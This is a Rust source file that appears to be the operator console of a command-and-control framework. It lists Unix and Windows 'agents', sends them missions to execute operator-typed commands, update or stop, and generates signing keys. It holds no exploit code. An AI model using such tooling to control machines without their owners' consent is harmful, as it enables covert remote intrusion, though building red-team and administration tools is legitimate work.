use base64::{prelude::BASE64_STANDARD, Engine as _};
use common::{crypto, model};
use thiserror::Error;

#[derive(Error, Debug)]
enum ClientError {
    #[error("dialoguer error: {0}")]
    Dialoguer(#[from] dialoguer::Error),
    #[error("io error: {0}")]
    Io(#[from] std::io::Error),
    #[error("ureq error: {0}")]
    Ureq(#[from] ureq::Error),
    #[error("serde_json error: {0}")]
    SerdeJson(#[from] serde_json::Error),
}

type ClientResult<T> = Result<T, ClientError>;

fn list_agents() -> ClientResult<Vec<model::Agent>> {
    let agents: Vec<model::Agent> = ureq::get("http://localhost:3000/agents")
        .call()?
        .into_json()?;
    Ok(agents)
}

fn issue_mission(agent_id: i32, task: model::Task) -> ClientResult<model::Mission> {
    // let f = fs::File::open("target/debug/agent")?;
    // let metadata = f.metadata()?;
    // println!("metadata len: {:?}", metadata.len());
    let mission: model::Mission = ureq::post("http://localhost:3000/missions")
        // .set("Content-Length", &metadata.len().to_string())
        .send_json(serde_json::to_value(&model::Mission {
            id: Default::default(),
            agent_id,
            task,
            result: None,
            issued_at: Default::default(),
            completed_at: None,
        })?)?
        .into_json()?;
    Ok(mission)
}

fn get_mission_result(mission_id: i32) -> ClientResult<Option<String>> {
    let response = ureq::get(&format!("http://localhost:3000/missions/{mission_id}")).call()?;
    if response.status() == 204 {
        Ok(None)
    } else {
        let result: Option<String> = response.into_json()?;
        Ok(result)
    }
}

fn prompt(prompt: &str) -> Result<String, dialoguer::Error> {
    dialoguer::Input::new()
        .with_prompt(prompt)
        .interact_text()
        .map(|s: String| s.trim().to_string())
}

fn select_agent_id(agents: &[model::Agent]) -> ClientResult<Option<i32>> {
    Ok(
        dialoguer::FuzzySelect::with_theme(&dialoguer::theme::ColorfulTheme::default())
            .with_prompt("Select an agent")
            .default(0)
            .items(&agents.iter().map(agent_fmt).collect::<Vec<_>>())
            .interact_opt()?
            .and_then(|i| agents.get(i).map(|a| a.id)),
    )
}

fn agent_fmt(agent: &model::Agent) -> String {
    format!(
        "{} [{}]: {}",
        agent.id,
        if agent.platform == model::Platform::Unix {
            "UNX"
        } else {
            "WIN"
        },
        agent.name
    )
}

fn main() -> ClientResult<()> {
    loop {
        let selection =
            dialoguer::FuzzySelect::with_theme(&dialoguer::theme::ColorfulTheme::default())
                .with_prompt("Select a subcommand")
                .default(0)
                .items(&[
                    "Issue mission",
                    "List agents",
                    "Update agent name",
                    "Generate identity key pair",
                    "Exit",
                ])
                .interact_opt()?;

        if let Some(selection) = selection {
            match selection {
                0 => {
                    let agents = list_agents()?;

                    let Some(agent_id) = select_agent_id(&agents)? else {
                        println!("No agent selected");
                        continue;
                    };

                    let Some(task) = dialoguer::FuzzySelect::with_theme(
                        &dialoguer::theme::ColorfulTheme::default(),
                    )
                    .with_prompt("Select a task")
                    .default(0)
                    .items(&["Update", "Execute", "Stop"])
                    .interact_opt()?
                    .and_then(|selection| match selection {
                        0 => {
                            // let agent_bin = fs::read("target/debug/agent").unwrap();
                            // Some(api::Task::Update(agent_bin))
                            Some(model::Task::Update(vec![]))
                        }
                        1 => Some(model::Task::Execute(prompt("Command").unwrap())),
                        2 => Some(model::Task::Stop),
                        _ => unreachable!(),
                    }) else {
                        println!("No task selected");
                        continue;
                    };

                    let mission = issue_mission(agent_id, task)?;
                    loop {
                        match get_mission_result(mission.id) {
                            Ok(Some(result)) => {
                                println!("{result}");
                                break;
                            }
                            Err(e) => eprintln!("{e}"),
                            _ => {}
                        }
                        std::thread::sleep(std::time::Duration::from_secs(1));
                    }
                }
                1 => {
                    for agent in list_agents()? {
                        println!("\t{}", agent_fmt(&agent));
                    }
                }
                2 => {
                    let agents = list_agents()?;

                    let Some(agent_id) = select_agent_id(&agents)? else {
                        println!("No agent selected");
                        continue;
                    };

                    let name = prompt("New name")?;

                    let response = ureq::put(&format!(
                        "http://localhost:3000/agents/{agent_id}/name/{name}"
                    ))
                    .call()?;

                    if response.status() == 200 {
                        println!("Agent name updated");
                    } else {
                        eprintln!("Failed to update agent name");
                    }
                }
                3 => {
                    let signing_key = crypto::get_signing_key();
                    println!(
                        "[+] Signing key: {:?}",
                        BASE64_STANDARD.encode(signing_key.as_bytes())
                    );
                    println!(
                        "[+] Verifying key: {:?}",
                        BASE64_STANDARD.encode(signing_key.verifying_key().as_bytes())
                    );
                }
                4 => break,
                _ => unreachable!(),
            }
        }
    }
    println!("Bye :)");
    Ok(())
}
